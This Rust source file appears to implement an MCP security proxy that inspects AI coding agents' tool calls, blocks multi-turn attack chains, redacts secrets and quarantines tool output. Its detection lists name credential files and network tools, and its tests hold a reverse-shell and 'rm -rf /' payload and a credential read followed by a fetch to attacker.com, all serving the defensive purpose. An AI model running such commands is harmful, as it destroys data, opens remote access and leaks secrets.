use crate::sast::{self, RuleCategory, SastSeverity, VulnerabilityFinding};
use colored::*;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs;
use std::path::Path;
use std::process::Stdio;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::process::Command;

#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct McpConfigFile {
    #[serde(default, rename = "mcpServers")]
    pub mcp_servers: HashMap<String, McpServerEntry>,
}

#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct McpServerEntry {
    pub command: String,
    #[serde(default)]
    pub args: Vec<String>,
    #[serde(default)]
    pub env: Option<HashMap<String, String>>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct McpAuditReport {
    pub total_servers: usize,
    pub findings: Vec<VulnerabilityFinding>,
    pub clean: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolCallRecord {
    pub timestamp: i64,
    pub tool_name: String,
    pub arguments: serde_json::Value,
    pub target_paths: Vec<String>,
    pub is_write: bool,
    pub is_execution: bool,
    pub is_sensitive_read: bool,
    pub is_network_outbound: bool,
}

#[derive(Debug, Clone)]
pub struct McpSessionTracker {
    pub history: Vec<ToolCallRecord>,
    pub max_history: usize,
    pub canary_registry: crate::canary::CanaryRegistry,
    pub velocity_limiter: crate::velocity::VelocityLimiter,
}

impl Default for McpSessionTracker {
    fn default() -> Self {
        Self {
            history: Vec::new(),
            max_history: 50,
            canary_registry: crate::canary::CanaryRegistry::default(),
            velocity_limiter: crate::velocity::VelocityLimiter::default(),
        }
    }
}

impl McpSessionTracker {
    pub fn new(max_history: usize) -> Self {
        Self {
            history: Vec::new(),
            max_history,
            canary_registry: crate::canary::CanaryRegistry::default(),
            velocity_limiter: crate::velocity::VelocityLimiter::default(),
        }
    }

    /// Recursively extract file target paths from tool call arguments
    pub fn extract_paths_from_json(val: &serde_json::Value) -> Vec<String> {
        let mut paths = Vec::new();
        match val {
            serde_json::Value::Object(map) => {
                for (k, v) in map {
                    let k_lower = k.to_lowercase();
                    if k_lower.contains("path")
                        || k_lower.contains("file")
                        || k_lower.contains("target")
                        || k_lower.contains("dest")
                    {
                        if let Some(s) = v.as_str() {
                            paths.push(s.to_string());
                        }
                    } else if k_lower.contains("command")
                        || k_lower.contains("cmd")
                        || k_lower.contains("script")
                    {
                        if let Some(cmd) = v.as_str() {
                            for word in cmd.split_whitespace() {
                                let w = word.trim_matches(|c| c == '\'' || c == '"' || c == ';');
                                if w.starts_with('/')
                                    || w.starts_with("./")
                                    || w.starts_with("../")
                                    || w.ends_with(".sh")
                                    || w.ends_with(".py")
                                    || w.ends_with(".js")
                                {
                                    paths.push(w.to_string());
                                }
                            }
                        }
                    }
                    paths.extend(Self::extract_paths_from_json(v));
                }
            }
            serde_json::Value::Array(arr) => {
                for item in arr {
                    paths.extend(Self::extract_paths_from_json(item));
                }
            }
            serde_json::Value::String(s) => {
                let w = s.trim_matches(|c| c == '\'' || c == '"');
                if w.starts_with('/') || w.starts_with("./") || w.starts_with("../") {
                    paths.push(w.to_string());
                }
            }
            _ => {}
        }
        paths
    }

    /// Classify and record tool invocation, evaluating against multi-turn attack patterns
    pub fn record_and_evaluate(
        &mut self,
        tool_name: &str,
        args_val: &serde_json::Value,
    ) -> Result<(), Box<VulnerabilityFinding>> {
        let now = chrono::Utc::now().timestamp();
        let name_lower = tool_name.to_lowercase();
        let args_str = args_val.to_string().to_lowercase();
        let extracted_paths = Self::extract_paths_from_json(args_val);

        let is_write = name_lower.contains("write")
            || name_lower.contains("create")
            || name_lower.contains("edit")
            || args_str.contains(" > ")
            || args_str.contains(" >> ")
            || args_str.contains("tee ")
            || args_str.contains("cat <<");

        let is_execution = name_lower.contains("command")
            || name_lower.contains("bash")
            || name_lower.contains("sh")
            || name_lower.contains("exec")
            || name_lower.contains("terminal")
            || name_lower.contains("run")
            || args_str.contains("chmod")
            || args_str.contains("bash ")
            || args_str.contains("python ")
            || args_str.contains("./");

        let is_sensitive_read = (name_lower.contains("read")
            || name_lower.contains("fetch")
            || name_lower.contains("cat")
            || name_lower.contains("open"))
            && (args_str.contains(".env")
                || args_str.contains("/etc/shadow")
                || args_str.contains("/etc/passwd")
                || args_str.contains("id_rsa")
                || args_str.contains(".ssh")
                || args_str.contains("credentials"));

        let is_network_outbound = name_lower.contains("fetch")
            || name_lower.contains("http")
            || name_lower.contains("curl")
            || name_lower.contains("upload")
            || name_lower.contains("send_message")
            || args_str.contains("curl ")
            || args_str.contains("wget ")
            || args_str.contains("fetch(")
            || args_str.contains("requests.post");

        // 1. Operational Velocity Enforcement
        self.velocity_limiter
            .record_and_check(crate::velocity::OperationType::ToolExecution, 1)?;
        if is_write {
            self.velocity_limiter
                .record_and_check(crate::velocity::OperationType::FileWrite, 1)?;
        }
        if is_network_outbound {
            self.velocity_limiter
                .record_and_check(crate::velocity::OperationType::NetworkOutbound, 1)?;
        }
        if is_sensitive_read {
            self.velocity_limiter
                .record_and_check(crate::velocity::OperationType::SensitiveRead, 1)?;
        }

        // 2. Dual-Key Authorization Gate (Irreversible Action Check)
        crate::velocity::DualKeyGate::evaluate_action(&args_str, None)?;

        // 3. In-Context Canary Token Leakage Check
        let canary_leaks = self.canary_registry.check_leak(&args_str);
        if let Some(finding) = canary_leaks.into_iter().next() {
            return Err(Box::new(finding));
        }

        // 4. Decoy Honeypot Path Interception Check
        for p in &extracted_paths {
            if let Some(finding) = self.canary_registry.check_path_access(p) {
                return Err(Box::new(finding));
            }
        }

        // 5. Context Quarantine Breakout Check
        crate::velocity::ContextQuarantine::check_quarantine_breach(&args_str)?;

        // Rule NW-MCP-005: Stateful Drop-and-Execute Chain
        // Attack Pattern: Tool writes a file (e.g. /tmp/stager.sh), and a subsequent tool turn executes it or marks it executable.
        if is_execution {
            for past in self.history.iter().rev().take(10) {
                if past.is_write {
                    for written_path in &past.target_paths {
                        let file_stem = std::path::Path::new(written_path)
                            .file_name()
                            .and_then(|f| f.to_str())
                            .unwrap_or(written_path);

                        if !file_stem.is_empty()
                            && (args_str.contains(written_path) || args_str.contains(file_stem))
                        {
                            return Err(Box::new(VulnerabilityFinding {
                                rule_id: "NW-MCP-005".to_string(),
                                title: "Stateful Multi-Turn Attack Chain: Staged Drop-and-Execute".to_string(),
                                category: RuleCategory::SystemExecution,
                                severity: SastSeverity::Critical,
                                file_path: Some(format!("mcp:{}", tool_name)),
                                line_number: None,
                                matched_snippet: format!(
                                    "Turn A: wrote '{}' -> Turn B: executed with args: '{}'",
                                    written_path,
                                    args_str.chars().take(80).collect::<String>()
                                ),
                                recommendation: "Block multi-turn drop-and-execute sequence; executing unverified dynamically written scripts is prohibited.".to_string(),
                            }));
                        }
                    }
                }
            }
        }

        // Rule NW-MCP-006: Stateful Multi-Turn Exfiltration Chain
        // Attack Pattern: Tool reads a sensitive credential/secret file, and a subsequent tool turn initiates outbound network communication.
        if is_network_outbound {
            for past in self.history.iter().rev().take(10) {
                if past.is_sensitive_read {
                    return Err(Box::new(VulnerabilityFinding {
                        rule_id: "NW-MCP-006".to_string(),
                        title: "Stateful Multi-Turn Attack Chain: Sensitive Read to Outbound Exfiltration".to_string(),
                        category: RuleCategory::SecretLeak,
                        severity: SastSeverity::Critical,
                        file_path: Some(format!("mcp:{}", tool_name)),
                        line_number: None,
                        matched_snippet: format!(
                            "Turn A: sensitive read in '{}' -> Turn B: outbound request in '{}'",
                            past.tool_name, tool_name
                        ),
                        recommendation: "Block multi-turn exfiltration chain; outbound network transfer immediately following credential file read detected.".to_string(),
                    }));
                }
            }
        }

        // Record the tool call in sliding history
        self.history.push(ToolCallRecord {
            timestamp: now,
            tool_name: tool_name.to_string(),
            arguments: args_val.clone(),
            target_paths: extracted_paths,
            is_write,
            is_execution,
            is_sensitive_read,
            is_network_outbound,
        });

        if self.history.len() > self.max_history {
            self.history.remove(0);
        }

        Ok(())
    }

    /// Classify, record, and semantically evaluate tool invocation using Jev System One
    pub async fn record_and_evaluate_semantic(
        &mut self,
        tool_name: &str,
        args_val: &serde_json::Value,
        jev_client: Option<&crate::jev::JevClient>,
    ) -> Result<(), Box<VulnerabilityFinding>> {
        self.record_and_evaluate(tool_name, args_val)?;

        if let Some(jc) = jev_client {
            let state = format!("TOOL: {tool_name}\nARGUMENTS: {args_val}");
            let instructions = "Does this tool execution command perform destructive filesystem alterations, system-level sabotage, credential exfiltration, or reverse shell injection?";
            if let Ok(prob) = jc.evaluate_noul(&state, instructions).await {
                if prob >= 0.70 {
                    return Err(Box::new(VulnerabilityFinding {
                        rule_id: "NW-SEM-001".to_string(),
                        title: "Semantic Agent Privilege Escalation or Malicious Action".to_string(),
                        category: RuleCategory::SystemExecution,
                        severity: SastSeverity::Critical,
                        file_path: Some(format!("mcp:{}", tool_name)),
                        line_number: None,
                        matched_snippet: format!("{tool_name}({args_val})"),
                        recommendation: format!(
                            "Jev System One evaluated destructive probability at {:.2} (Threshold: 0.70). Blocked tool execution.",
                            prob
                        ),
                    }));
                }
            }
        }
        Ok(())
    }
}

/// Audit an MCP configuration file (.agents/mcp_config.json) for security vulnerabilities
pub fn audit_mcp_config(config_path: &Path) -> Result<McpAuditReport, Box<dyn std::error::Error>> {
    let raw = fs::read_to_string(config_path)?;
    let parsed: McpConfigFile = serde_json::from_str(&raw)?;
    let mut findings = Vec::new();

    for (server_name, entry) in &parsed.mcp_servers {
        // 1. Audit executable command vector
        let cmd_findings =
            sast::scan_content(&entry.command, Some(&format!("mcp:{}", server_name)));
        findings.extend(cmd_findings);

        // Check for shell wrapping antipatterns
        if entry.command == "bash" || entry.command == "sh" || entry.command == "cmd.exe" {
            findings.push(VulnerabilityFinding {
                rule_id: "NW-MCP-001".to_string(),
                title: "Shell-Wrapped MCP Server Invocations".to_string(),
                category: RuleCategory::SystemExecution,
                severity: SastSeverity::High,
                file_path: Some(format!("mcp:{}", server_name)),
                line_number: None,
                matched_snippet: format!("command: {}", entry.command),
                recommendation: "Invoke standalone binary directly without shell interpreter wrapper to prevent command expansion.".to_string(),
            });
        }

        // 2. Audit arguments for injections or traversals
        let joined_args = entry.args.join(" ");
        let arg_findings = sast::scan_content(&joined_args, Some(&format!("mcp:{}", server_name)));
        findings.extend(arg_findings);

        // 3. Audit environment variables for exposed secrets
        if let Some(ref env_map) = entry.env {
            for (key, val) in env_map {
                let env_content = format!("{}={}", key, val);
                let env_findings =
                    sast::scan_content(&env_content, Some(&format!("mcp:{}:env", server_name)));
                findings.extend(env_findings);
            }
        }
    }

    let clean = findings.is_empty();
    Ok(McpAuditReport {
        total_servers: parsed.mcp_servers.len(),
        findings,
        clean,
    })
}

/// Inspect a runtime JSON-RPC Model Context Protocol payload with stateful session tracking
pub fn inspect_mcp_json_rpc_stateful(
    payload: &str,
    tracker: &mut McpSessionTracker,
) -> Result<(), Box<VulnerabilityFinding>> {
    if let Ok(val) = serde_json::from_str::<serde_json::Value>(payload) {
        let method = val["method"].as_str().unwrap_or("");

        if method == "tools/call" {
            let tool_name = val["params"]["name"].as_str().unwrap_or("unknown");
            let args_val = &val["params"]["arguments"];
            let args_str = args_val.to_string();

            // 1. Run SAST scan on serialized tool call arguments
            let findings = sast::scan_content(&args_str, Some(tool_name));
            if let Some(critical) = findings
                .into_iter()
                .find(|f| f.severity == SastSeverity::Critical || f.severity == SastSeverity::High)
            {
                return Err(Box::new(critical));
            }

            // 2. Stateful multi-turn attack chain evaluation
            tracker.record_and_evaluate(tool_name, args_val)?;
        } else if method == "resources/read" {
            let uri = val["params"]["uri"].as_str().unwrap_or("");
            if uri.contains("/etc/shadow") || uri.contains("/etc/passwd") || uri.contains("id_rsa")
            {
                return Err(Box::new(VulnerabilityFinding {
                    rule_id: "NW-MCP-002".to_string(),
                    title: "Sensitive Host Resource URI Access".to_string(),
                    category: RuleCategory::SystemExecution,
                    severity: SastSeverity::Critical,
                    file_path: Some("mcp:resources/read".to_string()),
                    line_number: None,
                    matched_snippet: uri.to_string(),
                    recommendation:
                        "Enforce workspace boundary sandbox; restrict host credential file reads."
                            .to_string(),
                }));
            }
        }
    }

    Ok(())
}

/// Inspect a runtime JSON-RPC Model Context Protocol payload (stateless convenience wrapper)
pub fn inspect_mcp_json_rpc(payload: &str) -> Result<(), Box<VulnerabilityFinding>> {
    let mut tracker = McpSessionTracker::default();
    inspect_mcp_json_rpc_stateful(payload, &mut tracker)
}

/// Transform incoming JSON-RPC line from client with stateful multi-turn tracking
pub fn process_client_mcp_line_stateful(
    line: &str,
    sanitize: bool,
    tracker: &mut McpSessionTracker,
) -> Result<String, (serde_json::Value, Box<VulnerabilityFinding>)> {
    match inspect_mcp_json_rpc_stateful(line, tracker) {
        Ok(()) => {
            if sanitize {
                let (sanitized, _) = sast::sanitize_secrets(line);
                Ok(sanitized)
            } else {
                Ok(line.to_string())
            }
        }
        Err(finding) => {
            let req_id = serde_json::from_str::<serde_json::Value>(line)
                .ok()
                .and_then(|v| v.get("id").cloned())
                .unwrap_or(serde_json::Value::Null);

            let err_resp = serde_json::json!({
                "jsonrpc": "2.0",
                "id": req_id,
                "error": {
                    "code": -32000,
                    "message": format!(
                        "Nether Ward Sentinel: Tool invocation blocked by perimeter firewall. Rule: {} [{}]",
                        finding.title, finding.rule_id
                    ),
                    "data": {
                        "rule_id": finding.rule_id,
                        "category": finding.category.to_string(),
                        "severity": finding.severity.to_string(),
                        "recommendation": finding.recommendation
                    }
                }
            });

            Err((err_resp, finding))
        }
    }
}

/// Transform incoming JSON-RPC line from client, intercepting and blocking hostile tool invocations
pub fn process_client_mcp_line(
    line: &str,
    sanitize: bool,
) -> Result<String, (serde_json::Value, Box<VulnerabilityFinding>)> {
    let mut tracker = McpSessionTracker::default();
    process_client_mcp_line_stateful(line, sanitize, &mut tracker)
}

/// Transform outgoing JSON-RPC line from server to client, redacting secrets and optionally wrapping tool outputs in Context Quarantine
pub fn process_server_mcp_line(line: &str, sanitize: bool, quarantine: bool) -> String {
    let mut current = if sanitize {
        let (sanitized, _) = sast::sanitize_secrets(line);
        sanitized
    } else {
        line.to_string()
    };

    if quarantine {
        if let Ok(mut val) = serde_json::from_str::<serde_json::Value>(&current) {
            if let Some(content_arr) = val
                .get_mut("result")
                .and_then(|r| r.get_mut("content"))
                .and_then(|c| c.as_array_mut())
            {
                let mut modified = false;
                for item in content_arr {
                    if item.get("type").and_then(|t| t.as_str()) == Some("text") {
                        if let Some(text_val) = item.get_mut("text") {
                            if let Some(text_str) = text_val.as_str() {
                                if !text_str
                                    .contains(crate::velocity::ContextQuarantine::START_MARKER)
                                {
                                    *text_val = serde_json::Value::String(
                                        crate::velocity::ContextQuarantine::wrap(
                                            text_str,
                                            "mcp_tool_result",
                                        ),
                                    );
                                    modified = true;
                                }
                            }
                        }
                    }
                }
                if modified {
                    if let Ok(serialized) = serde_json::to_string(&val) {
                        current = serialized;
                    }
                }
            }
        }
    }

    current
}

/// Run bidirectional stdio proxy between coding agent and underlying MCP server
pub async fn run_mcp_proxy(
    cmd: &str,
    args: &[String],
    sanitize: bool,
    semantic: bool,
    quarantine: bool,
) -> Result<(), Box<dyn std::error::Error>> {
    let jev_opt = if semantic {
        crate::jev::JevClient::from_env_or_config()
    } else {
        None
    };

    eprintln!(
        "{} Initializing stdio proxy for target '{}' (Sanitization: {}, Semantic Firewall: {}, Quarantine: {})",
        "NETHER WARD MCP PROXY:".cyan().bold(),
        cmd,
        if sanitize {
            "Active".green()
        } else {
            "Disabled".yellow()
        },
        if jev_opt.is_some() {
            "Active (Jev System One)".green()
        } else if semantic {
            "Awaiting TYPESAFE_API_KEY".yellow()
        } else {
            "Disabled".yellow()
        },
        if quarantine {
            "Active (Context Quarantine Boundary)".green()
        } else {
            "Disabled".yellow()
        }
    );

    let mut child = Command::new(cmd)
        .args(args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::inherit())
        .spawn()?;

    let mut child_stdin = child.stdin.take().expect("Child stdin unavailable");
    let child_stdout = child.stdout.take().expect("Child stdout unavailable");

    // Task 1: Stdin from parent process (agent) -> inspect / sanitize -> child stdin
    let stdin_task = tokio::spawn(async move {
        let stdin = tokio::io::stdin();
        let mut reader = BufReader::new(stdin).lines();
        let mut tracker = McpSessionTracker::default();

        while let Ok(Some(line)) = reader.next_line().await {
            let line_trimmed = line.trim();
            if line_trimmed.is_empty() {
                continue;
            }

            // Check semantic safety if Jev client is configured
            let semantic_block = if let Some(ref jc) = jev_opt {
                if let Ok(val) = serde_json::from_str::<serde_json::Value>(line_trimmed) {
                    if val.get("method").and_then(|m| m.as_str()) == Some("tools/call") {
                        let tool_name = val["params"]["name"].as_str().unwrap_or("tool");
                        let tool_args = &val["params"]["arguments"];
                        tracker
                            .record_and_evaluate_semantic(tool_name, tool_args, Some(jc))
                            .await
                            .err()
                    } else {
                        None
                    }
                } else {
                    None
                }
            } else {
                None
            };

            if let Some(finding) = semantic_block {
                eprintln!(
                    "{} Blocked hostile MCP tool invocation: {} [{}]",
                    "NETHER WARD MCP PROXY:".red().bold(),
                    finding.title,
                    finding.rule_id
                );
                let req_id = serde_json::from_str::<serde_json::Value>(line_trimmed)
                    .ok()
                    .and_then(|v| v.get("id").cloned())
                    .unwrap_or(serde_json::Value::Null);
                let err_resp = serde_json::json!({
                    "jsonrpc": "2.0",
                    "id": req_id,
                    "error": {
                        "code": -32000,
                        "message": format!(
                            "Nether Ward Sentinel: Tool invocation blocked by semantic firewall. Rule: {} [{}]",
                            finding.title, finding.rule_id
                        )
                    }
                });
                let mut stdout = tokio::io::stdout();
                let _ = stdout.write_all(format!("{}\n", err_resp).as_bytes()).await;
                let _ = stdout.flush().await;
                continue;
            }

            match process_client_mcp_line_stateful(line_trimmed, sanitize, &mut tracker) {
                Ok(forward_line) => {
                    if let Err(e) = child_stdin
                        .write_all(format!("{forward_line}\n").as_bytes())
                        .await
                    {
                        eprintln!("Nether Ward MCP Proxy: Target stdin closed: {e}");
                        break;
                    }
                    let _ = child_stdin.flush().await;
                }
                Err((err_resp, finding)) => {
                    eprintln!(
                        "{} Blocked hostile MCP tool invocation: {} [{}]",
                        "NETHER WARD MCP PROXY:".red().bold(),
                        finding.title,
                        finding.rule_id
                    );
                    let mut stdout = tokio::io::stdout();
                    let _ = stdout.write_all(format!("{}\n", err_resp).as_bytes()).await;
                    let _ = stdout.flush().await;
                }
            }
        }
    });

    // Task 2: Child stdout -> sanitize secrets -> parent stdout
    let stdout_task = tokio::spawn(async move {
        let mut reader = BufReader::new(child_stdout).lines();
        let mut stdout = tokio::io::stdout();

        while let Ok(Some(line)) = reader.next_line().await {
            let out_line = process_server_mcp_line(&line, sanitize, quarantine);
            if let Err(e) = stdout.write_all(format!("{out_line}\n").as_bytes()).await {
                eprintln!("Nether Ward MCP Proxy: Client stdout closed: {e}");
                break;
            }
            let _ = stdout.flush().await;
        }
    });

    let (res, _, _) = tokio::join!(child.wait(), stdin_task, stdout_task);
    if let Ok(status) = res {
        if let Some(code) = status.code() {
            if code != 0 {
                std::process::exit(code);
            }
        }
    }

    Ok(())
}

pub fn print_mcp_report(report: &McpAuditReport, path_str: &str) {
    println!(
        "\n{}",
        "================================================================================".blue()
    );
    println!(
        "{}",
        "          NETHER WARD: MODEL CONTEXT PROTOCOL (MCP) SECURITY AUDIT             "
            .bold()
            .cyan()
    );
    println!(
        "{}",
        "================================================================================".blue()
    );
    println!("{:<24}: {}", "Config Path".bold(), path_str);
    println!(
        "{:<24}: {}",
        "Configured Servers".bold(),
        report.total_servers
    );
    println!("{:<24}: {}", "Findings Count".bold(), report.findings.len());

    if report.clean {
        println!(
            "{:<24}: {}",
            "Audit Status".bold(),
            "CLEAN (Zero Vulnerabilities Detected)".green().bold()
        );
    } else {
        println!(
            "{:<24}: {}",
            "Audit Status".bold(),
            format!("VULNERABILITIES DETECTED ({})", report.findings.len())
                .red()
                .bold()
        );
        println!(
            "\n{:<12} {:<10} {:<30} {:<24}",
            "RULE ID".bold(),
            "SEVERITY".bold(),
            "TITLE".bold(),
            "TARGET".bold()
        );
        println!(
            "{}",
            "--------------------------------------------------------------------------------"
                .blue()
        );
        for f in &report.findings {
            let sev_colored = match f.severity {
                SastSeverity::Critical => f.severity.to_string().red().bold(),
                SastSeverity::High => f.severity.to_string().red(),
                SastSeverity::Medium => f.severity.to_string().yellow(),
                SastSeverity::Low | SastSeverity::Info => f.severity.to_string().cyan(),
            };
            println!(
                "{:<12} {:<10} {:<30} {:<24}",
                f.rule_id.bold(),
                sev_colored,
                f.title.chars().take(30).collect::<String>(),
                f.file_path.as_deref().unwrap_or("-")
            );
            println!("  Snippet: {}", f.matched_snippet.italic());
            println!("  Fix:     {}", f.recommendation);
            println!();
        }
    }
    println!(
        "{}",
        "================================================================================".blue()
    );
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_inspect_clean_mcp_tool_call() {
        let payload = r#"{"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "read_file", "arguments": {"Path": "/home/user/project/src/main.rs"}}}"#;
        assert!(inspect_mcp_json_rpc(payload).is_ok());
    }

    #[test]
    fn test_inspect_hostile_mcp_tool_call() {
        let payload = r#"{"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {"name": "run_command", "arguments": {"CommandLine": "rm -rf / && /bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1"}}}"#;
        let res = inspect_mcp_json_rpc(payload);
        assert!(res.is_err());
        let err = res.unwrap_err();
        assert_eq!(err.category, RuleCategory::SystemExecution);
    }

    #[test]
    fn test_inspect_sensitive_mcp_resource() {
        let payload = r#"{"jsonrpc": "2.0", "id": 3, "method": "resources/read", "params": {"uri": "file:///etc/shadow"}}"#;
        let res = inspect_mcp_json_rpc(payload);
        assert!(res.is_err());
        let err = res.unwrap_err();
        assert_eq!(err.rule_id, "NW-MCP-002");
    }

    #[test]
    fn test_audit_clean_mcp_config() {
        let temp_path = std::env::temp_dir().join("test_clean_mcp.json");
        let content = r#"{
            "mcpServers": {
                "git": { "command": "mcp-server-git", "args": ["--repo", "/tmp/repo"] },
                "fetch": { "command": "mcp-server-fetch", "args": [] }
            }
        }"#;
        fs::write(&temp_path, content).unwrap();
        let report = audit_mcp_config(&temp_path).unwrap();
        assert_eq!(report.total_servers, 2);
        assert!(report.clean);
        let _ = fs::remove_file(temp_path);
    }

    #[test]
    fn test_audit_vulnerable_mcp_config() {
        let temp_path = std::env::temp_dir().join("test_vuln_mcp.json");
        let content = r#"{
            "mcpServers": {
                "insecure": {
                    "command": "bash",
                    "args": ["-c", "eval $(cat secret.txt)"],
                    "env": {
                        "AWS_SECRET": "AKIAIOSFODNN7EXAMPLE"
                    }
                }
            }
        }"#;
        fs::write(&temp_path, content).unwrap();
        let report = audit_mcp_config(&temp_path).unwrap();
        assert_eq!(report.total_servers, 1);
        assert!(!report.clean);
        assert!(report.findings.iter().any(|f| f.rule_id == "NW-MCP-001"));
        assert!(report.findings.iter().any(|f| f.rule_id == "NW-SEC-001"));
        let _ = fs::remove_file(temp_path);
    }

    #[test]
    fn test_process_client_mcp_line_clean_forwarding() {
        let line = r#"{"jsonrpc":"2.0","id":10,"method":"tools/call","params":{"name":"read_file","arguments":{"Path":"/home/user/file.txt"}}}"#;
        let res = process_client_mcp_line(line, false);
        assert!(res.is_ok());
        assert_eq!(res.unwrap(), line);
    }

    #[test]
    fn test_process_client_mcp_line_blocked_error_injection() {
        let line = r#"{"jsonrpc":"2.0","id":99,"method":"tools/call","params":{"name":"run_command","arguments":{"CommandLine":"rm -rf /"}}}"#;
        let res = process_client_mcp_line(line, false);
        assert!(res.is_err());
        let (err_json, finding) = res.unwrap_err();
        assert_eq!(err_json["jsonrpc"], "2.0");
        assert_eq!(err_json["id"], 99);
        assert_eq!(err_json["error"]["code"], -32000);
        assert!(err_json["error"]["message"]
            .as_str()
            .unwrap()
            .contains("Nether Ward Sentinel"));
        assert_eq!(finding.category, RuleCategory::SystemExecution);
    }

    #[test]
    fn test_process_server_mcp_line_secret_redaction() {
        let line = r#"{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"AWS_KEY=AKIAIOSFODNN7EXAMPLE"}]}}"#;
        let sanitized = process_server_mcp_line(line, true, false);
        assert!(!sanitized.contains("AKIAIOSFODNN7EXAMPLE"));
        assert!(sanitized.contains("AKIA***REDACTED***MPLE"));
    }

    #[test]
    fn test_process_server_mcp_line_quarantine_wrapping() {
        let line = r#"{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"External untrusted data retrieved from web"}]}}"#;
        let quarantined = process_server_mcp_line(line, false, true);
        assert!(quarantined.contains("<<<NETHER_WARD_QUARANTINE_BOUNDARY"));
        assert!(quarantined.contains("<<</NETHER_WARD_QUARANTINE_BOUNDARY>>>"));
    }

    #[test]
    fn test_stateful_mcp_tracker_drop_and_execute_blocked() {
        let mut tracker = McpSessionTracker::default();

        // Turn 1: Benign write of a script to /tmp/stager.sh
        let turn1 = r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"write_file","arguments":{"path":"/tmp/stager.sh","content":"echo hello"}}}"#;
        let res1 = process_client_mcp_line_stateful(turn1, false, &mut tracker);
        assert!(res1.is_ok(), "Turn 1 write should be allowed");

        // Turn 2: Attempting to execute the staged file
        let turn2 = r#"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"run_command","arguments":{"command":"bash /tmp/stager.sh"}}}"#;
        let res2 = process_client_mcp_line_stateful(turn2, false, &mut tracker);
        assert!(
            res2.is_err(),
            "Turn 2 execution of staged file must be blocked"
        );
        let (_, finding) = res2.unwrap_err();
        assert_eq!(finding.rule_id, "NW-MCP-005");
        assert_eq!(finding.severity, SastSeverity::Critical);
    }

    #[test]
    fn test_stateful_mcp_tracker_sensitive_read_to_exfiltration_blocked() {
        let mut tracker = McpSessionTracker::default();

        // Turn 1: Read sensitive credentials
        let turn1 = r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{"path":".env"}}}"#;
        let res1 = process_client_mcp_line_stateful(turn1, false, &mut tracker);
        assert!(res1.is_ok(), "Reading .env is recorded");

        // Turn 2: Subsequent outbound network transmission
        let turn2 = r#"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"fetch","arguments":{"url":"https://attacker.com/collect"}}}"#;
        let res2 = process_client_mcp_line_stateful(turn2, false, &mut tracker);
        assert!(
            res2.is_err(),
            "Outbound exfiltration after credential read must be blocked"
        );
        let (_, finding) = res2.unwrap_err();
        assert_eq!(finding.rule_id, "NW-MCP-006");
        assert_eq!(finding.severity, SastSeverity::Critical);
    }

    #[test]
    fn test_stateful_mcp_tracker_benign_multi_turn_allowed() {
        let mut tracker = McpSessionTracker::default();

        // Turn 1: Read code
        let turn1 = r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"src/main.rs"}}}"#;
        assert!(process_client_mcp_line_stateful(turn1, false, &mut tracker).is_ok());

        // Turn 2: Run test suite
        let turn2 = r#"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"run_command","arguments":{"command":"cargo test"}}}"#;
        assert!(process_client_mcp_line_stateful(turn2, false, &mut tracker).is_ok());
    }
}
